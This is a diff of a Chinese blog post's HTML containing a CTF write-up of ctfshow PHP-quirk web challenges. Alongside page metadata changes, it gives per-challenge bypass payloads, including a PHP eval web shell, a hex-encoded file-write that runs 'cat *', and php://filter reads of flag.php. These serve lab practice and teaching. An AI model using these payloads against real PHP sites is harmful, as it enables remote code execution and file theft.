@@ -20,73 +20,74 @@
     var CONFIG = {"hostname":"yun421.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="ctfshow.PHP特性web89(https:&#x2F;&#x2F;gitee.com&#x2F;yun421&#x2F;picgo&#x2F;raw&#x2F;master&#x2F;img&#x2F;chrome_Jb5AopKoUw.png) 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
+  <meta name="description" content="ctfshow.PHP特性web89 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Yun421">
-<meta property="og:url" content="http://yun421.top/2022/03/03/ctfshow.PHP%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:title" content="ctfshow.PHP特性">
+<meta property="og:url" content="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/index.html">
 <meta property="og:site_name" content="Yun421">
-<meta property="og:description" content="ctfshow.PHP特性web89(https:&#x2F;&#x2F;gitee.com&#x2F;yun421&#x2F;picgo&#x2F;raw&#x2F;master&#x2F;img&#x2F;chrome_Jb5AopKoUw.png) 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
+<meta property="og:description" content="ctfshow.PHP特性web89 数组绕过正则表达式 12返回值返回完整匹配次数（可能是0），或者如果发生错误返回FALSE。  也就是说如果我们不按规定传一个字符串，而是数组的话，就会返回false，从而不会进入if payload:num[]&#x3D;1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_gduw5EGYmx.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718914.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_IvEwGmF6Iw.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_QzRexRF5zf.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_jMEnq13pgy.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718064.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_NlAabp7Skh.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_PQDjIAiOQO.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_5vTOQBAn5N.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718120.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_jVoKZrYSTD.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_RaM5M2MzTD.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_o4rUHC9XAU.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_macamcSN0m.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718363.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718432.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Amz6uPzInf.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_PbRHT1FGsF.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_zQGdSeRPtK.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718073.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718404.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_38ppT01WvJ.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_WekDb6GAUG.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_j6Warj79IS.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_hcFocP58tM.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718586.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718977.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_93ZQjT1xMh.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_BIakEtsKZq.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_tSIHJl27oq.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718316.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718437.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_xS7vGDB3Wo.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_X5AnH5a53a.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_1mq0dye4nS.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_2woolNjJnf.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_aZATZb9wVO.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718142.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_dOBlWnxqi8.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_jiOr3XvL3e.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_XW87RTD312.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Dl5Rm8jFAT.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718594.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718729.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718156.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113171135398.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172042516.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113172713166.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211113173127022.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718141.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211127175952923.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211127181844899.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20211127185417656.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718801.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302154737630.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302155428801.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718998.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185137867.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185633851.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302185911047.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302190624722.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302194944923.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302195947529.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718052.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718854.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210048715.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302210319210.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302212139253.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220302213827488.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718920.png">
 <meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220303172712538.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220303175202944.png">
-<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/image-20220303184731286.png">
-<meta property="article:published_time" content="2022-03-03T12:43:21.861Z">
-<meta property="article:modified_time" content="2022-03-03T12:57:58.344Z">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718694.png">
+<meta property="og:image" content="https://gitee.com/yun421/picgo/raw/master/img/202203041718804.png">
+<meta property="article:published_time" content="2022-03-04T09:17:29.000Z">
+<meta property="article:modified_time" content="2022-03-04T09:22:02.760Z">
 <meta property="article:author" content="Yun421">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_gduw5EGYmx.png">
+<meta name="twitter:image" content="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png">
 
-<link rel="canonical" href="http://yun421.top/2022/03/03/ctfshow.PHP%E7%89%B9%E6%80%A7/">
+<link rel="canonical" href="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/">
 
 
 <script id="page-configurations">
@@ -99,7 +100,7 @@
   };
 </script>
 
-  <title> | Yun421</title>
+  <title>ctfshow.PHP特性 | Yun421</title>
   
 
 
@@ -226,7 +227,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yun421.top/2022/03/03/ctfshow.PHP%E7%89%B9%E6%80%A7/">
+    <link itemprop="mainEntityOfPage" href="http://yun421.top/2022/03/04/ctfshow.PHP%E7%89%B9%E6%80%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -239,7 +240,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          
+          ctfshow.PHP特性
         </h1>
 
         <div class="post-meta">
@@ -250,7 +251,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-03-03 20:43:21 / 修改时间：20:57:58" itemprop="dateCreated datePublished" datetime="2022-03-03T20:43:21+08:00">2022-03-03</time>
+              <time title="创建时间：2022-03-04 17:17:29 / 修改时间：17:22:02" itemprop="dateCreated datePublished" datetime="2022-03-04T17:17:29+08:00">2022-03-04</time>
             </span>
 
           
@@ -264,7 +265,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="ctfshow-PHP特性"><a href="#ctfshow-PHP特性" class="headerlink" title="ctfshow.PHP特性"></a>ctfshow.PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>(<a target="_blank" rel="noopener" href="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png">https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png</a>)</p>
+        <h1 id="ctfshow-PHP特性"><a href="#ctfshow-PHP特性" class="headerlink" title="ctfshow.PHP特性"></a>ctfshow.PHP特性</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_Jb5AopKoUw.png" alt="chrome_Jb5AopKoUw"></p>
 <p>数组绕过正则表达式</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">返回值</span><br><span class="line">返回完整匹配次数（可能是<span class="number">0</span>），或者如果发生错误返回<span class="literal">FALSE</span>。</span><br></pre></td></tr></table></figure>
 
@@ -272,7 +273,7 @@
 <p>payload:num[]=1</p>
 <span id="more"></span>
 
-<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_gduw5EGYmx.png" alt="chrome_gduw5EGYmx"></p>
+<h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718914.png" alt="chrome_gduw5EGYmx"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intval ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] ) : <span class="keyword">int</span></span><br><span class="line">Note:</span><br><span class="line">如果 base 是 <span class="number">0</span>，通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；否则，</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；否则，</span><br><span class="line">将使用 <span class="number">10</span> 进制 (decimal)</span><br></pre></td></tr></table></figure>
 
 <p>payload：num=4476.</p>
@@ -287,7 +288,7 @@
 <h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_QzRexRF5zf.png" alt="chrome_QzRexRF5zf"></p>
 <p>两层判断，第一层不能是4476，第二层取整，于是直接小数点绕过</p>
 <p>payload：num=4476.1</p>
-<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_jMEnq13pgy.png" alt="chrome_jMEnq13pgy"></p>
+<h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718064.png" alt="chrome_jMEnq13pgy"></p>
 <p>多过滤了字母，不影响操作</p>
 <p>payload：num=4476.1</p>
 <h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_NlAabp7Skh.png" alt="chrome_NlAabp7Skh"></p>
@@ -300,7 +301,7 @@
 <p>把小数点过滤了</p>
 <p>用8进制绕过一下</p>
 <p>payload：num= 010574</p>
-<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_5vTOQBAn5N.png" alt="chrome_5vTOQBAn5N"></p>
+<h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718120.png" alt="chrome_5vTOQBAn5N"></p>
 <p>路径问题<br>下面方式在highlight_file中均等效于flag.php，也即本题的payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/flag.php              绝对路径</span><br><span class="line">./flag.php                          相对路径</span><br><span class="line">php://filter/resource=flag.php      php伪协议</span><br></pre></td></tr></table></figure>
 
@@ -330,7 +331,7 @@
 <p>payload：</p>
 <p>get：1 </p>
 <p>post：HTTP_FLAG=flag</p>
-<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_o4rUHC9XAU.png" alt="chrome_o4rUHC9XAU"></p>
+<h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718363.png" alt="chrome_o4rUHC9XAU"></p>
 <p>上边的for就是生成了一个有数字组成的数组</p>
 <p>php弱类型比较</p>
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$allow = array(<span class="number">1</span>,<span class="comment">&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回的为true</span><br><span class="line"></span><br><span class="line">$allow = array(<span class="comment">&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;);</span></span><br><span class="line">var_dump(in_array(<span class="comment">&#x27;1.php&#x27;,$allow));</span></span><br><span class="line">返回false</span><br></pre></td></tr></table></figure>
@@ -339,7 +340,7 @@
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">get</span>：n=<span class="number">1</span>.php </span><br><span class="line">post：content=&lt;?php eval($_POST[<span class="number">1</span>]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>后面命令执行了</p>
-<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_macamcSN0m.png" alt="chrome_macamcSN0m"></p>
+<h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718432.png" alt="chrome_macamcSN0m"></p>
 <p>我们看这个题get传入v1,v2,v3，v0即满足v1为数字即可。</p>
 <p>and和&amp;&amp;的区别：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">true</span> &amp;&amp; <span class="literal">false</span> &amp;&amp; <span class="literal">false</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);  返回<span class="literal">false</span></span><br></pre></td></tr></table></figure>
@@ -361,7 +362,7 @@
 <p>payload：v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</p>
 <p>得到flag为ctfshow{ceceb8250x2d8cc20x2d4cad0x2d8c210x2d7dc29013d3a},注意将0x2d转换为-，</p>
 <p>ctfshow{ceceb825-8cc2-4cad-8c21-7dc29013d3a}，flag少最后一位，爆破一下或手动都可</p>
-<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_PbRHT1FGsF.png" alt="chrome_PbRHT1FGsF"></p>
+<h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718073.png" alt="chrome_PbRHT1FGsF"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.is_numeric()</span><br><span class="line">判断是否是数字，is_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的</span><br><span class="line">var_dump(is_numeric(<span class="string">&quot;0x66&quot;</span>));  </span><br><span class="line">// php5的环境下返回<span class="literal">true</span>  php7返回<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">2.substr()</span><br><span class="line">字符串截取函数</span><br><span class="line">substr(<span class="string">&quot;Hello world&quot;</span>,6);</span><br><span class="line">从length长度开始截取默认是直到字符串的结尾</span><br><span class="line">// 输出 world</span><br><span class="line">    </span><br><span class="line">3.call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">把第一个参数作为回调函数调用</span><br><span class="line">也就是说<span class="variable">$v1</span>可以是函数名,<span class="variable">$s</span>就是函数的值,就可以调用函数</span><br><span class="line">    </span><br><span class="line">4.file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>)</span><br><span class="line">把str的内容放入v3文件中</span><br></pre></td></tr></table></figure>
 
 <p>利用is_numeric的特性传入一个十六进制数,通过substr函数时 0x 会被截去, call_user_func 函数处调用 hex2bin 函数将16进制转换成字符串写入文件中</p>
@@ -383,7 +384,7 @@
 
 
 
-<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_zQGdSeRPtK.png" alt="chrome_zQGdSeRPtK"></p>
+<h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718404.png" alt="chrome_zQGdSeRPtK"></p>
 <p>对str变量过滤掉了php，不影响操作</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?=`cat *`;&#x27;</span>; </span><br><span class="line"><span class="variable">$b</span>=base64_encode(<span class="variable">$a</span>);  *// PD89YGNhdCAqYDs=* </span><br><span class="line"><span class="variable">$c</span>=bin2hex(<span class="variable">$b</span>);      *//这里直接用去掉=的base64* </span><br><span class="line">输出   5044383959474e6864434171594473 </span><br></pre></td></tr></table></figure>
 
@@ -402,7 +403,7 @@
 
 
 
-<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_j6Warj79IS.png" alt="chrome_j6Warj79IS"></p>
+<h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718586.png" alt="chrome_j6Warj79IS"></p>
 <p>这个题比较了v1和v2的值，那么我们还可以使用数组绕过，或者网上找一下sha1后相同的值</p>
 <p>payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:v2=a1</span><br><span class="line">post:v1=a2</span><br></pre></td></tr></table></figure>
@@ -411,7 +412,7 @@
 
 
 
-<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_hcFocP58tM.png" alt="chrome_hcFocP58tM"></p>
+<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718977.png" alt="chrome_hcFocP58tM"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">parse_str(<span class="keyword">string</span>,<span class="keyword">array</span>) </span><br><span class="line">函数把查询字符串解析到变量中 </span><br><span class="line"><span class="keyword">string</span>  必需。规定要解析的字符串 </span><br><span class="line"><span class="keyword">array</span>	可选。规定存储变量的数组名称。该参数指示变量存储到数组中</span><br></pre></td></tr></table></figure>
 
 <p>举个例子</p>
@@ -431,7 +432,7 @@
 
 <p>构造payload，if要求c中要有字母，后面用%00截断绕过，十进制的0x36d为877，翻转后应该是778</p>
 <p>payload：c=a%00778</p>
-<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_BIakEtsKZq.png" alt="chrome_BIakEtsKZq"></p>
+<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718316.png" alt="chrome_BIakEtsKZq"></p>
 <p><strong>考察点：php 异常类</strong><br>先来看下这个正则表达式/[a-zA-Z]+/ 匹配至少有一个字母的字符串<br>所以我们只要让new后面有个类不报错以后，就可以随意构造了。我们随便找个php中的内置类并且可以直接echo输出的就可以了。<br>举两个例子</p>
 <figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Exception</span><br><span class="line">ReflectionClass</span><br></pre></td></tr></table></figure>
 
@@ -440,7 +441,7 @@
 
 
 
-<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_tSIHJl27oq.png" alt="chrome_tSIHJl27oq"></p>
+<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718437.png" alt="chrome_tSIHJl27oq"></p>
 <p>对v1和v2进行了大量的过滤</p>
 <p><strong>考察点：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件</strong><br>具体使用方法<br>所以我们只需要再得到一个点或者路径就可以查看当前目录下的文件，得到一个/查看根目录下的文件。php中的getcwd()可以帮到我们这个忙。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getcwd()</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">getcwd(void):string</span><br></pre></td></tr></table></figure>
@@ -473,7 +474,7 @@
 <h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_2woolNjJnf.png" alt="chrome_2woolNjJnf"></p>
 <p>又把filter放出来了，那就直接出</p>
 <p>payload：file=php://filter/resource=flag.php</p>
-<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_aZATZb9wVO.png" alt="chrome_aZATZb9wVO"></p>
+<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718142.png" alt="chrome_aZATZb9wVO"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">参数	描述</span><br><span class="line">string	        必需。规定要检查的字符串。</span><br><span class="line">charlist	    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\0&quot;</span>       - NULL</span><br><span class="line"><span class="string">&quot;\t&quot;</span>       - 制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>       - 换行</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>     - 垂直制表符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>       - 回车</span><br><span class="line"><span class="string">&quot; &quot;</span>        - 空格</span><br></pre></td></tr></table></figure>
 
 <p>写一个测试</p>
@@ -504,7 +505,7 @@
 
 
 
-<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/chrome_jiOr3XvL3e.png" alt="chrome_jiOr3XvL3e"></p>
+<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041718594.png" alt="chrome_jiOr3XvL3e"></p>
 <p>和上一题基本一样，过滤了一些东西，不影响操作</p>
 <p>payload: </p>
